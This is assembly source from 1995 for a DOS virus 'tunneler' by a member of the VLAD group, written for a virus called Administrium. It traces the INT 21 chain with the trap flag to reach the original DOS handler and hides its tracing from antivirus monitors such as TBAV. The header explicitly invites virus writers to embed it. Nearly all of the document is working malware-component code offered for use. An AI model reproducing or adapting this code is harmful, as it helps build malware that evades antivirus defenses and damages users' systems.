
; ; ; ; ; ; ; ; ; ; íÔ≈çg‰n's Radical Tunneler ; ; ; ; ; ; ; ; ;
;;;               Copyright 1995 by íÔ≈çg‰n/VLAD             ;;;
;;;           Written specifically for Administrium          ;;;
;;;                which is unfortunately late               ;;;
; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ;; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ;
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^;
;  This is by far the most revolutionary (and largest) tunnel- ;
; er that I have encountered, and I hope that you will agree   ;
; with me in awe of its might and power. ;)  The basic idea is ;
; that very few AV packages test for tunneling, but those that ;
; do can render a mega-/<rad polymorphic stealth armoured IRQ  ;
; hooking virus absolutely useless with just a few opcodes.    ;
;  I found this to be somewhat unjust, and decided to take     ;
; matters into my own hands.  Here is the fruit of my labors!  ;
; If you want to include it in a virus, I grant you permission ;
; to take the code and modify it as needed as long as you can  ;
; somehow send me a copy of your source code before you pub-   ;
; lish or release it.  I can be reached through Metabolis at:  ;
;
;    meta@tmok.res.wpi.edu
;
; so send any code you include it in also send any bug reports ;
; and solutions if you have them. I have tested this as
; thoroughly as possible, but may have missed a possibility by ;
; some small quirk.  The total size of íRT is 1.6k, which I    ;
; consider to be a small price for complete invulnerability to ;
; common and even most uncommon detection/disabling methods.   ;
; But I'll let the code speak for itself.                      ;
;   Have a blast,
; --íÔ≈çg‰n
; February 3, 1995

; note: this code is designed for resident virii only, as non-resident are
;       lame enough that they shouldn't be tunneling anyway ;)
; $pecial shout-out goes to Memory Lapse of P/S for the insights,
; Mr. Twister of NuKE, and Lookout for the ·eta testing as well as the
; rest of VLAD and other P/S members.

ideal                           ; I like TASM - so kill me
radix   16                      ; it can be easily translated into
segment code    'code'          ; MASM/a86 style by taking all ptr
org     100                     ; expressions and segment overrides and
assume  cs:code                 ; putting them outside the brackets
tunl_setup:                     ; like mov byte ptr cs:[t_flags],0
	mov     [byte ptr cs:t_flags],0         ; turn off all trap flags
	mov     [word ptr cs:savedSP],sp
	mov     [word ptr cs:savedSS],ss
	mov     [byte ptr cs:_ax + 1],30
	mov     ax,3501
	int     21
	mov     [word ptr cs:savedINT1],bx
	mov     [word ptr cs:savedINT1+2],es
	mov     ah,52
	int     21                      ; get the list of lists
	mov     ax,[es:bx - 2]          ; the segment of the 1st MCB
	mov     [word ptr cs:first_MCB],ax
	cwd                             ; zero dx
	mov     ds,dx
	mov     ax,offset trap
	mov     [4],ax
	mov     [6],cs                  ; store our handler
	mov     ax,cs
	mov     ss,ax
	mov     sp,offset fooger_stack  ; pretend we've traced a jmp(or such)
	mov     ax,300                  ; enable ints, trapping
	push    ax
	popf
	mov     ah,30                   ; this is not traced
	int     21                      ; this is
;; the tunneler disables itself when it has reached the original DOS int 21
	cmp     al,2                    ; DOS <= v2.0?
	jl      do_what_you_want_my_virus_aborts
do_what_you_want_my_virus_aborts:
	mov     ax,4c00
	cmp     [word ptr cs:saved21_CS],0ffff  ; did we encounter 386+ ops?
	jne     no_problem_tunneling
	inc     ax                      ; ax = 4c01 (errorlevel 1)
no_problem_tunneling:
	int     21                      ; exit
;; ***** This is the most revolutionary part of what wil be Administrium
;; the tunneler uses extensive anti-anti-tunneling methods, and counteracts
;; even some unusual anti-tunneling methods.  Most importantly, it can
;; withstand any stack tests for tunneling.  (i.e. TBAV resistant)
;; here's how:
;  -if an instruction cannot be simulated (modifies cs,ip,and/or sp),
;   the contents of the old stack are copied to a temporary new stack
;   and the instruction is traced using the new stack.
;  -on return to the tracer it restores the old stack, changing sp to
;   reflect any changes made to the other stack, and bytes are copied as
;   is necessary for call/int
;  -if the instruction is div or idiv, the operand is tested to see if it
;   will generate an int 0 (divide overflow exception).  If it will, the
;   INT 0 is hooked, and traced, hiding signs of the tunneler
;  -if an instruction modifies the flags, the trap flag is hidden unless
;   the program actually sets it
;  -if an instruction is 286 protected/386+ and is not recognized, it is
;   not simulated and the tunneler aborts
;  -if OK, it loads the instruction into a temporary code buffer, and
;   executes it, adjusting for factors such as cs:override, etc.
;  -then it restores the first 5 bytes of the tunneler in case they were
;   changed, restores the int 1 vector, and cycles to the next instruction
;   SKIPPING the trap step so no stack modification is done
;;************************************
; t_flag bit-mapped values:
; 1  - set ds = the traced cs when executing the instruction, used if a cs:
;      override is in the traced code
; 2  - the traced handler has set the trap flag
; 4  - the previous instruction was an INT
; 8  - tracing through INT 0 handler
; 10 - set es = old ss when tracing a jmp [ss:where]
; 20 - ss: was used
; 40 - this instruction has an 8 bit immediate value
; 80 - this instruction has a 16 bit immediate value
trap:
; on entry, the stack is:
;  flags
;  CS
;  IP
; of the INT 21 being traced
	pop     [word ptr cs:savedIP] [word ptr cs:savedCS]
	pop     [word ptr cs:flags]
	mov     [word ptr cs:newSP],sp          ; save to do stack setup
	mov     [word ptr cs:saved_retto],offset trap_ret1
	jmp     pop_all                         ; 'call' pop_all
trap_ret1:                                      ; return to here
	test    [byte ptr cs:t_flags],10        ; was es set to ss?
	jz      no_es_shit                      ; don't change code if so
	mov     es,[word ptr cs:_es]            ; old es was saved here
	and     [byte ptr cs:t_flags],not 10    ; make sure es != ss
	mov     ds,[word ptr cs:savedCS]        ; ds = old CS
	mov     si,[word ptr cs:SSIP]           ; si = IP of the ss:
	mov     [byte ptr si],36                ; change 'es:' bk to 'ss:'
no_es_shit:
	mov     ax,offset fooger_stack          ; ax = sp if no changes
	sub     ax,[word ptr cs:newSP]          ; get the difference
	jz      test_for_int                    ; no changes to sp
	jb      added_to_SP             ; call, int, call far sub. from sp
	mov     cx,ax                           ; cx = number of bytes pushed
	sub     [word ptr cs:savedSP],ax        ; make sure we remember
	sub     sp,ax                           ; with both :)
	cld                                     ; move bytes forwards
	mov     ax,cs
	mov     ds,ax
	mov     si,[word ptr cs:newSP]          ; ds:si = temp stack
	mov     es,[word ptr cs:savedSS]
	mov     di,sp                           ; es:di = original stack
	rep     movsb                           ; copy any changes
	jmp     test_for_int                    ; continue tunneling
added_to_SP:                            ; ret, retf, iret, etc. adds to sp
	sub     [word ptr cs:savedSP],ax        ; subtracting the -number = +
	sub     sp,ax                           ; adjust sp also
test_for_int:
	mov     ds,[word ptr cs:savedCS]        ; restore in case of trapping
	mov     si,[word ptr cs:savedIP]
	test    [byte ptr cs:t_flags],4         ; was the last instruc an int?
	je      not_int                         ; no, continue
	mov     bp,sp                           ; stack= +0 IP +2 CS +4 flags
	and     [word ptr bp+4],not 100         ; hide trap flag
	and     [byte ptr cs:t_flags],not 4     ; clear the INT flag
not_int:
;; go to here if the last instruction was only simulated
skip_trap:
	and     [byte ptr cs:t_flags],not 1     ; turn off ds=cs flag
	cld                                     ; move forwards
	mov     [word ptr cs:savedIP],si        ; save in case we DIDN'T
	mov     [word ptr cs:savedCS],ds        ; trap and jmped to here
	test    [byte ptr cs:t_flags],8         ; are we tracing INT0?
	jne     continue_trap                   ; can't be in DOSseg if so
	mov     ax,[word ptr cs:first_MCB]
	cmp     [word ptr cs:savedCS],ax        ; are we in the DOSseg?
	jae     continue_trap                   ; DOSseg < first MCB
	mov     [word ptr cs:saved21_CS],ds     ; ds = DOSseg
	mov     [word ptr cs:saved21_IP],si     ; si = DOSofs
	xor     cx,cx                           ; ensure cleanup works :)
	mov     [word ptr cs:saved_retto],offset cover_tracks
	jmp     pop_all                         ; 'call' pop_all
cover_tracks:                                   ; return to here
	and     [word ptr cs:flags],not 100     ; turn off trapping
	jmp     regular_exit                    ; done tunneling (yay!)
continue_trap:
	mov     ax,cs
	mov     es,ax                   ; es=cs
	mov     di,offset code_buf      ; es:di=code buffer
get_opcode:
	lodsw                           ; load 2 instruction bytes into ax
	xor     cx,cx                   ; possibly needed later on
do_tests:                               ; by cleanup (no moving of stack)
	cmp     al,0e                   ; push cs?
	jne     c1
	add     al,10                   ; do a push ds instead
	or      [byte ptr cs:t_flags],1 ; set ds=old cs
c1:
	cmp     al,26                   ; es:?
	jne     c2
do_save:
	cmp     al,36                   ; ss:?
	jne     no_memory
	or      [byte ptr cs:t_flags],20        ; remember ss: was used
	dec     si
	dec     si                      ; adjust for the lodsw
	mov     [word ptr cs:SSIP],si   ; save location of ss: (ss: IP)
	inc     si
	inc     si
	jmp     save_byte
no_memory:
	and     [byte ptr cs:t_flags],not 20    ; turn off ss: used flag
save_byte:
	stosb                           ; save in code buffer
no_save_continue:
	lodsb                           ; load next instruction byte
	xchg    ah,al                   ; set up for a simulated lodsw
	jmp     do_tests                ; cycle up to do_tests
c2:
	cmp     al,2e                   ; cs:?
	jne     c3
	or      [byte ptr cs:t_flags],1 ; set ds=old cs
	or      al,10                   ; store ds:
	jmp     do_save                 ; save in code buffer
c3:
	cmp     al,36                   ; ss:?
	je      do_save
	cmp     al,3e                   ; ds:?
	jne     c3a
	and     [byte ptr cs:t_flags],not 1     ; ds != cs anymore
	jmp     do_save                 ; save in code buffer
c3a:
	cmp     al,8c                   ; mov r/m16,Sreg?
	jne     c4
	stosb                           ; save instruction byte
	xchg    ah,al                   ; al = ModR/M byte
	mov     bx,ax                   ; save it temporarily
	and     al,111000b              ; isolate the Segment register
	cmp     al,1000b                ; cs?
	jne     no_ds                   ; if so, we use ds instead
	or      bl,10000b               ; use ds
	or      [byte ptr cs:t_flags],1 ; set ds = old cs
no_ds:
	mov     [word ptr cs:saved_retto],offset execute_and_exit
	jmp     get_instruction         ; 'call' get_instruction
no_get_opcode:
	mov     [word ptr cs:saved_retto],offset execute_and_exit
	jmp     get_instruction         ; 'call' get_instruction
c4:
	cmp     al,9c                   ; pushf?
	jne     c6
	push    [word ptr cs:flags]     ; simulate it
	mov     [word ptr cs:savedSP],sp        ; save the new SP
;; si = location of the pushf + 2, so we decrement it to skip the pushf
	dec     si                      ; skip the pushf
	test    [byte ptr cs:t_flags],2 ; is trap supposed to be on?
	jne     no_mod
	pop     bx                      ; bx = flags
	and     bx,not 100              ; turn off trap flag
	push    bx                      ; save the new stealthed flags
no_mod:
	jmp     skip_trap               ; cycle up to skip_trap
c6:
	cmp     al,9dh                  ; popf?
	jne     c7
	pop     ax                      ; ax = new flags
	mov     [word ptr cs:flags],ax  ; save them
;; si = location of the popf + 2, so we decrement it to skip the pushf
	dec     si                      ; skip the popf
	test    ax,100                  ; are they turning ON trapping?
	je      no_prob                 ; if no, then we stealth
	or      [byte ptr cs:t_flags],2 ; remember this fact
	jmp     continue_popf
no_prob:
	and     [byte ptr cs:t_flags],not 2     ; make sure the flag is off
continue_popf:
	and     [word ptr cs:flags],not 100     ; "turn off" the trap flag
	mov     [word ptr cs:savedSP],sp        ; save the new SP
	jmp     no_mod                  ; cycle to skip_trap
c7:
	cmp     al,0c2                  ; ret iw?
	jne     c8
do_ret:
	mov     cx,2                    ; only need to save return address
	jmp     goto_cleanup            ; go down to cleanup
c8:
	cmp     al,0c3                  ; ret?
	je      do_ret                  ; cx = 0
c9:
	cmp     al,0ca                  ; retf iw?
	jne     c10
do_retf:
	add     cx,4                    ; only need to save return address
	jmp     goto_cleanup            ; go down to cleanup
c10:
	cmp     al,0cbh                 ; retf?
	je      do_retf
	cmp     al,0cf                  ; iret?
	jne     c11
;; stack:
;  [sp+4] = flags
;  [sp+2] = CS
;  [sp+0] = IP
	mov     bp,sp
	or      [word ptr bp+4],100     ; ensure trapping is on
	and     [byte ptr cs:t_flags],not 8     ; turn off in INT 0 flag
	mov     cx,6                    ; save the 6 stack bytes
goto_cleanup:
	jmp     cleanup                 ; go down to cleanup
goto_scan:
	jmp     scan                    ; start scanning the lists of opcodes
c11:
	cmp     al,0c8                  ; enter?
	jne     no_enter
	stosw                           ; save the 4 byte instruction
	movsw                           ; enter is the only constant 4 byter
	jmp     execute_and_exit
no_enter:
	cmp     al,0cc                  ; int 3?
	je      hide_trap
	cmp     al,0ce                  ; into?
	jne     c11a
	test    [word ptr cs:flags],800 ; is the overflow flag set?
	jne     hide_trap
	jmp     no_save_continue        ; no, so no interrupt generated
push_orig:
	push    [word ptr cs:savedIP]   ; push the original IP for INT 0
	jmp     continue_int
c11a:
	cmp     al,0cdh                 ; int ??
	jne     c11b
hide_trap:
	or      [byte ptr cs:t_flags],4 ; remember to hide the trap flag
	push    [word ptr cs:flags]     ; fake the interrupt
	push    ds                      ; ds = old cs
;; ax = ??cd where ?? is the int number
	test    ah,ah                   ; int 0?
	je      push_orig               ; save original IP
	push    si                      ; si = IP of instruc AFTER the INT ??
continue_int:
	mov     [word ptr cs:savedSP],sp        ; remember the new sp
	mov     [word ptr cs:retto],ax  ; save the number of the INT
	xor     ax,ax
	mov     ds,ax
	mov     ax,[word ptr cs:retto]
	xchg    ah,al                   ; ax = cd??
	xor     ah,ah                   ; ax = 00?? (the interrupt number)
	shl     ax,2                    ; ax = ax*4 (the vector address)
	mov     si,ax                   ; ds:si = int ?? vector
	lodsw                           ; ax = int??ofs
	mov     [word ptr cs:savedIP],ax        ; simulate the trace
	lodsw                           ; ax = int??seg
	mov     [word ptr cs:savedCS],ax ;set the new CS:IP as if interrupted
	and     [word ptr cs:flags],not 300 ; turn off trapping and interrupts
	jmp     test_for_int            ; cycle to start of trapping
no_hide_flag:
	jmp     goto_cleanup            ; nothing need be saved
c11b:
	cmp     ax,0d4                  ; AAM 0? (causes divide overflow)
	je      goto_dd0                ; definitely divide by 0
	cmp     al,0f0                  ; lock?
	jne     c12
d_save_prefix:
	jmp     do_save                 ; save the prefix
c12:
	cmp     al,0f2                  ; repne?
	je      d_save_prefix
	cmp     al,0f3                  ; rep?
	je      d_save_prefix
	cmp     al,0f6
	je      goto_might_be_div_0     ; might cause an INT 0 to happen
	cmp     al,0f7
	je      goto_might_be_div_0     ; INT 0 = divide overflow
	cmp     al,0ff                  ; could be indirect jump
	je      goto_ticj               ; test ofr indirect call/jmp
	cmp     al,40
	jb      test_80
	cmp     al,61
	ja      test_80
	jmp     save_1_byter            ; 40 <= opcodes <= 61 are 1 byters
test_80:
	cmp     al,80
	jb      scan
	cmp     al,8f                   ; 80 <= opcodes <= 8f are ModR/Mers
	ja      scan
	jmp     save_ModRMer
scan:
	mov     bp,di                   ; save offset into code buffer
	mov     di,offset one_byters
	mov     dx,offset next_scan     ; the return address
	mov     cx,two_byters-one_byters
	jmp     scan_for_match          ; see if al is a 1 byte instruction
next_scan:
	jcxz    cont1                   ; cx != 0 means it is
save_1_byter:
	stosb                           ; save it
	dec     si                      ; si - 1 = next instruction offset
	jmp     execute_and_exit
cont1:
	add     dx,next_scan1-next_scan ; adjust for next return address
	mov     cx,three_byters-two_byters
	jmp     scan_for_match
next_scan1:
	jcxz    cont2
	stosw                           ; save the opcode
	jmp     execute_and_exit
cont2:
	add     dx,next_scan2-next_scan1
	mov     cx,modrm-three_byters
	jmp     scan_for_match
goto_might_be_div_0:
	jmp     might_be_div_0          ; space-saving jump
next_scan2:
	jcxz    cont3
	stosw                           ; 3 byte instruction
	movsb
	jmp     execute_and_exit
goto_dd0:
	jmp     definitely_div_0
cont3:
	add     dx,next_scan3-next_scan2
	mov     cx,abort-modrm
	jmp     scan_for_match
goto_ticj:
	jmp     test_indirect_call_jmp
	;-----------------------; This is called if the ModR/M
do_imm16:                       ; instruction also includes
	or      [byte ptr cs:t_flags],80        ; an immediate value so that
do_imm8:                        ; get_instruction can copy the
	or      [byte ptr cs:t_flags],40        ; correct number of bytes to
goto_get_instruction:           ; the code_buf
	mov     [word ptr cs:saved_retto],offset execute_and_exit
	xchg    ah,al           ;
	mov     bx,ax           ; save the ModR/M
	jmp     get_instruction ;
	;-----------------------;
next_scan3:
	jcxz    cont4
save_ModRMer:
	stosb                   ; save opcode (ModR/M length uncertain)
is_OK_indirect:
	cmp     al,69           ; imul
	je      do_imm16
	cmp     al,6bh          ; imul
	je      do_imm8
	cmp     al,80           ; immediate
	je      do_imm8
	cmp     al,81           ; immediate
	je      do_imm16
	cmp     al,82           ; immediate
	je      do_imm8
	cmp     al,83           ; immediate
	je      do_imm16
	cmp     al,0c0          ; shift
	je      do_imm8
	cmp     al,0c1          ; shift
	je      do_imm16
	cmp     al,0c6          ; mov
	je      do_imm8
	cmp     al,0c7          ; mov
	je      do_imm16
	jmp     goto_get_instruction
cont4:
	add     dx,end_scan-next_scan3
	mov     cx,end_opcodes-abort
	jmp     scan_for_match
end_scan:
	jcxz    no_flag         ; no unrecognized opcodes are simulated
	mov     [word ptr cs:saved21_CS],0ffff
	jmp     cover_tracks
;; done scanning - no matches or non-handleable opcodes encountered
;; instructions left over modify cs and/or ip
; (call, call far, jmp, jmp far, ret etc.)
no_flag:
	and     [byte ptr cs:t_flags],not 1     ; turn off cs=ds JUST IN CASE
cleanup:
;; cx set to number of bytes to move from old stack to temporary stack
;; 0 if not a ret/retf/ret xxxx/retf xxxx
	mov     ax,cs
	mov     es,ax                   ; es:di = cs:fooger_stack
	mov     di,offset fooger_stack  ; move bytes from sp + xx to fooger
	mov     ds,[word ptr cs:savedSS]        ; ds:si = old ss:sp
	mov     si,[word ptr cs:savedSP]
	cld
	rep     movsb                   ; cx has already been set to
					; the number of bytes to remember
	mov     [word ptr cs:saved_retto],offset bibi
	jmp     pop_all                 ; 'call' pop_all
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
might_be_div_0:
	mov     bx,ax                   ; bx = saved ModR/M byte and instruc.
	xchg    ah,al                   ; al = ModR/M byte
	and     al,111000b              ; isolate opcode of ModR/M
	cmp     al,110000b              ; div?
	je      isit_0
	cmp     al,111000b              ; idiv?
	je      isit_0
	xchg    ax,bx                   ; restore the instruction\ModR/M
	jmp     scan                    ; not div/idiv
test_indirect_call_jmp:
	stosb                           ; save opcode just in case
	xchg    ah,al                   ; al = ModR/M
	mov     bx,ax                   ; save it
	and     al,111000b              ; isolate opcode of ModR/M
	cmp     al,10000b
	jb      no_problem
	cmp     al,101000b
	jbe     test_for_ss             ; it is a call/jmp indirect
no_problem:
	xchg    ax,bx                   ; restore and continue
	jmp     is_OK_indirect
test_for_ss:
	test    [byte ptr cs:t_flags],20        ; ss: used?
	je      cleanup                 ; if not, no worries
	xor     [byte ptr cs:t_flags],30        ; turn on set es=ss flag
					; -and- turn off ss: used
	mov     si,[word ptr cs:SSIP]   ; si = location of the ss:
	sub     [byte ptr si],10        ; change the ss: to es:
	jmp     cleanup                 ; exit
bibi:                                   ; bye bye!
	mov     ax,cs
	mov     ss,ax
	mov     sp,offset fooger_stack  ; set ss:sp = temporary stack
	mov     ax,[word ptr cs:_ax]
	or      [word ptr cs:flags],100 ; ensure trapping is on
regular_exit:
	push    [word ptr cs:flags]
	push    [word ptr cs:savedCS]
	push    [word ptr cs:savedIP]   ; restore the stack and return :)
	iret
isit_0:
	sub     di,offset code_buf
	mov     [word ptr cs:saved_codebuf],di  ; save the difference
	add     di,offset code_buf
	xchg    ax,bx                   ; al = instruction,ah = ModR/M
	test    al,1                    ; word operand or byte operand?
	jne     its_word                ; it's a word operand
	mov     al,80                   ; will be cmp r/m8,0
	jmp     continue_is0            ; skip next part
its_word:
	mov     al,83           ; will be cmp r/m16,0 <-- sign extended imm8
continue_is0:
	stosb                           ; save the new opcode
	xchg    ah,al                   ; al = ModR/M
	or      al,111000b              ; make the opcode a cmp
	mov     bx,ax                   ; let get_instruction do the rest
	mov     [word ptr cs:saved_retto],offset goto_cmp
	jmp     get_instruction         ; 'call' get_instruction
goto_cmp:
	xor     al,al                   ; make the constant a 0
	stosb                           ; save the constant
	mov     [word ptr cs:retto],offset setup_if_div_0
	dec     si
	dec     si                      ; pretend we never looked at the div
	sub     si,[word ptr cs:saved_codebuf]  ; adjust for # of seg ov.
	jmp     execute                 ; compare the operand to 0
;; if it is 0, then an INT 0 will be generated - we must hook this in case
;; it is
setup_if_div_0:
	jne     return_to_scan  ; this is immediately after 'cmp r/mX,0'
;********************************************************
;* an INT 0 will be called if we div, so we just pretend
;* that it was and cycle up to skip_trap
definitely_div_0:
	mov     ax,[word ptr cs:flags]
	test    [byte ptr cs:t_flags],2 ; they turn on the trap flag?
	jne     no_hide_TF
	and     ax,not 100              ; turn off TF
no_hide_TF:
	push    ax
	and     ax,not 200              ; turn off IF
	mov     [word ptr cs:flags],ax
	push    [word ptr cs:savedCS]
	push    [word ptr cs:savedIP]   ; fake the pending INT 0
	mov     [word ptr cs:savedSP],sp
	xor     ax,ax
	mov     ds,ax
	mov     ax,[0]                  ; ax = old INT0ofs
	mov     si,ax
	mov     ax,[2]                  ; ax = old INT0seg
	mov     ds,ax
	or      [byte ptr cs:t_flags],8 ; turn on in INT 0 flag
	jmp     skip_trap               ; trace their int 0 handler
return_to_scan:                         ; not div 0, so OK to do normally
	mov     ax,cs
	mov     es,ax
	mov     di,offset code_buf
	add     di,[word ptr cs:saved_codebuf]  ; use the same segment shtuff
	mov     si,[word ptr cs:savedIP]
	add     si,[word ptr cs:saved_codebuf]  ; skip the actual stuff
	mov     [word ptr cs:savedIP],si
	mov     ds,[word ptr cs:savedCS]
	lodsw                           ; ax = the div :)
	jmp     scan                    ; simulate it normally
push_all:
	mov     [word ptr cs:_ds],ds    ; save ds
save_all_but_DS:                        ; self-explanatory :)
	mov     [word ptr cs:savedSS],ss
	mov     [word ptr cs:savedSP],sp
	mov     sp,cs                   ; saved sp so we can do this
	mov     ss,sp                   ; (will fuck up some debuggers)
	mov     sp,offset top_of_stack  ; ss:sp = saved registers
	push    ax bx cx dx si di bp es ; save processor state
	mov     ax,cs                   ; ds saved up 9 lines
	mov     ss,ax
	mov     sp,offset fooger_stack  ; ss:sp = temporary stack
	pushf                           ; push flags
	pop     [word ptr cs:flags]     ; save the current flags
	mov     ax,[word ptr cs:_ax]    ; restore ax
	mov     ss,[word ptr cs:savedSS]
	mov     sp,[word ptr cs:savedSP]        ; restore ss:sp
	jmp     [word ptr cs:saved_retto]       ; return to caller
pop_all:
	mov     sp,cs
	mov     ss,sp
	mov     sp,offset _ds                   ; ss:sp = saved registers
	pop     ds es bp di si dx cx bx ax      ; restore processor state
	mov     bp,offset normal_pop_all        ; retto for pop_flags
	test    [byte ptr cs:t_flags],10        ; set es = ss?
	je      pop_flags                       ; no, then normal pop_all
	mov     bp,offset set_es_eq_ss          ; set es=ss on return
	jmp     pop_flags                       ; 'call' pop_flags
set_es_eq_ss:
	mov     es,[word ptr cs:savedSS]        ; es = old ss
normal_pop_all:
	mov     bp,[word ptr cs:_bp]            ; restore bp
	mov     ss,[word ptr cs:savedSS]        ; restore ss:sp
	mov     sp,[word ptr cs:savedSP]
	jmp     [word ptr cs:saved_retto]       ; return to caller
pop_flags:
	mov     ax,cs
	mov     ss,ax
	mov     sp,offset flags                 ; ss:sp = flags
	pop     ax                              ; ax = flags
	mov     sp,[word ptr cs:newSP]          ; preserve fooger sp
	and     ax,not 100                      ; don't turn on trapping
	push    ax                              ; (endless loop)
	popf                                    ; flags = processor state
	mov     ax,[word ptr cs:_ax]            ; restore ax
	jmp     bp                              ; return
scan_for_match:                                 ; scan es:di for al
	cld
	repne   scasb
	jcxz    back                            ; if cx==0 then al not found
	mov     di,bp                           ; restore es:di to codebuf
back:
	jmp     dx                              ; return to scanning up there
;; copy instruction from ds:si to code buffer - this handles
;; copying the correct number of bytes for instructions with a ModR/M
;entry:bl=modrm,ds:si=instruction remaining (if any)
get_instruction:
	mov     al,bl                           ; bl = saved ModR/M
	and     al,11000111b                    ; al = Mod & R/M only
	cmp     al,01000000b                    ; Mod > 2 == could have disp
	jae     might_have_disp
	cmp     al,110b                         ; it is a 16 bit disp
	je      do_disp16
ret_save:
	mov     al,bl                           ; al = Mod|Reg|R/M again
	stosb                                   ; save it
_ret:
	test    [byte ptr cs:t_flags],0C0       ; any immediate byte/word?
	jz      do__ret                         ; 0 = no
	test    [byte ptr cs:t_flags],80        ; 16 bit immediate?
	jz      only_1
	movsb                                   ; 16 bit immediate for sure
only_1:
	movsb                                   ; only 8 bit immediate
	and     [byte ptr cs:t_flags],not 0C0   ; clear the imm flags
do__ret:
	jmp     [word ptr cs:saved_retto]       ; i.e. ret without stack
might_have_disp:
	cmp     al,11000000b                    ; is R/M a register?
	jae     ret_save                        ; if so no disp
	cmp     al,10000000b                    ; 8-bit displacement?
	jb      do_disp8
do_disp16:                                      ; must be 16 bit
	mov     al,bl                           ; save MoDR/M
	stosb
	movsw                                   ; save the disp16
	jmp     _ret                            ; return to caller
do_disp8:
	mov     al,bl                           ; al = ModR/M
	stosb                                   ; save it
	movsb                                   ; save the disp8
	jmp     _ret                            ; return to caller
execute_and_exit:
	mov     [word ptr cs:retto],offset cont_exe_ret
;; because execute is called by the "isit_0" subroutine to test
;; the operand of a div/idiv instruction for 0, this value must be
;; placed in retto for all other calls to execute since there is a
;; "break" (to use C++ language) in the middle for the exception of
;; div 0 testing
execute:
	xchg    ax,di                           ; save code_buf offset
	mov     [word ptr cs:savedCS],ds
	mov     [word ptr cs:savedIP],si        ; save new CS:IP traced
	mov     di,cs
	mov     ds,di
	xor     di,di
	mov     es,di                           ; es:di = INT 1 vector
	add     di,4
	mov     si,offset savedINT1             ; ds:si = saved INT 1 vector
	movsw
	movsw                                   ; set the original vector
;; move a 'jmp [word ptr cs:saved_retto]' into code_buf
	mov     di,cs
	mov     es,di
	xchg    ax,di                           ; es:di = cs:code_buf
	mov     ax,0ff2e                        ;cs:...
	stosw
	mov     ax,(low offset saved_retto) shl 8 + 26
	stosw
	mov     al,(high offset saved_retto)
	stosb                                   ; ...jmp [saved_retto]
	test    [byte ptr cs:t_flags],1         ; use ds=cs?
	je      no
	mov     [word ptr cs:saved_retto],offset set_DS_CS
	jmp     pop_all                         ; 'call' pop_all
no:
	mov     [word ptr cs:saved_retto],offset exe_ret1
	jmp     pop_all
set_DS_CS:
	mov     ax,[word ptr cs:savedCS]
	mov     ds,ax                           ; set DS = CS
	mov     ax,[word ptr cs:_ax]            ; restore ax
exe_ret1:
restore:
	mov     [word ptr cs:saved_retto],offset exe_ret
	jmp     codebuf                         ; do the instruction
exe_ret:
	jmp     [word ptr cs:retto]             ; goto_div if test div 0
cont_exe_ret:
	mov     [word ptr cs:saved_retto],offset ret_exe
	jmp     save_all_but_DS                 ; self-explanatory
ret_exe:
	mov     ax,ds
	mov     bx,cs
	cmp     ax,bx                           ; ds==cs?
	jne     noCS_DS                         ; if ds != cs then save ds
	mov     ds,[word ptr cs:_ds]
noCS_DS:
	mov     [word ptr cs:_ds],ds            ; save it in case ds != cs
;;******************************************
;; restore the first 6 bytes of our tunneler
	mov     ax,cs
	mov     es,ax
	mov     di,offset trap                  ; es:di = cs:trap
	mov     ax,8f2e
	stosw
	mov     ax,(low offset savedIP) shl 8 + 6
	stosw
	mov     ax,2e00 + (high offset savedIP)
	stosw
	xor     ax,ax
	mov     ds,ax
	mov     es,ax
	mov     di,4
	mov     si,di                           ; es:di = ds:si = INT 1
	lodsw
	mov     [word ptr cs:savedINT1],ax
	lodsw
	mov     [word ptr cs:savedINT1 + 2],ax  ; save changes to INT 1
	mov     ax,offset trap
	stosw
	mov     ax,cs
	stosw                                   ; restore the real INT 1
goto_skip_trap:
	mov     ds,[word ptr cs:savedCS]
	mov     si,[word ptr cs:savedIP]        ; ds:si = traced cs:ip
	jmp     skip_trap                       ; do next instruction
one_byters:
	db      6,7,0e
	db      16,17,1e,1f
	db      27,2f
	db      37,3f
	db      6c,6dh,6e,6f
	db      90,91,92,93,94,95,96,97,98,99,9bh,9e,9f
	db      0a4,0a5,0a6,0a7,0aa,0abh,0ac,0adh,0ae,0af
	db      0c9
	db      0d7
	;skip halt (no need to worry if that's executed!)
	db      0f5,0f8,0f9,0fa,0fbh,0fc,0fdh
two_byters:
	db      04,0c,14,1c,24,2c,34,3c ;add/or/adc/sbb/and/sub/xor/cmp al,ib
	db      6a                      ;push imm8
	db      0a8                     ;test al,ib
	db      0b0,0b1,0b2,0b3,0b4,0b5,0b6,0b7         ;mov rl/h, ib
	db      0d4,0d5                 ;aam and aad
	db      0e4,0e6                 ;in/out al,ib
	db      0e5,0e7                 ;in/out ax,ib
three_byters:
	db      05,0dh,15,1dh,25,2dh,35,3dh,45,4dh,55,5dh ;add/or/etc. ax,iw
	db      68                      ; push imm16
	db      0a0,0a1,0a2,0a3         ;mov al/ax,[mx],mov [mx],al/ax
	db      0a9                     ;test ax,iw
	db      0b8,0b9,0ba,0bbh,0bc,0bdh,0be,0bf       ;mov rx,iw
modrm:
	db      0,1,2,3,8,9,0a,0bh
	db      10,11,12,13,18,19,1a,1bh
	db      20,21,22,23,28,29,2a,2bh
	db      30,31,32,33,38,39,3a,3bh
	db      69,6a
	db      0c0,0c1,0c4,0c5,0c6,0c7,0d0,0d1,0d2,0d3,0d4
	db      0f6,0f7,0fe
abort:
	db      0f,63,66,67,0d6,0f1
end_opcodes:

old_CS  dw      ?
oldint21:                       ; what you should use to do DOS functions
	pushf                   ; is 'mov ah,function/call oldint21'
db      9a              ; call far oldint21
saved21_IP      dw      ?
saved21_CS      dw      ?
	ret
currentint21:
	pushf
db      9a
cur21o  dw      ?
cur21s  dw      ?
PSP_seg dw      ?
vir_end:

t_flags:
first_MCB:
db      ?
db      ?
retto:
db      ?
db      ?
saved_retto:
db      ?
db      ?
savedSS:
db      ?
db      ?
savedSP:
db      ?
db      ?
saved_codebuf:
db      ?
db      ?
newSP:
db      ?
db      ?
SSIP:
db      ?
db      ?
savedCS:
db      ?
db      ?
savedIP:
db      ?
db      ?
_ds:    dw      ?
_es:    dw      ?
_bp:    dw      ?
_di:    dw      ?
_si:    dw      ?
_dx:    dw      ?
_cx:    dw      ?
_bx:    dw      ?
_ax:    dw      ?
top_of_stack:
savedINT0:      dd      ?
savedINT1:      dd      ?
codebuf:
code_buf        db      0c dup (?)
flags:  dw      ?
db      20      dup (?)
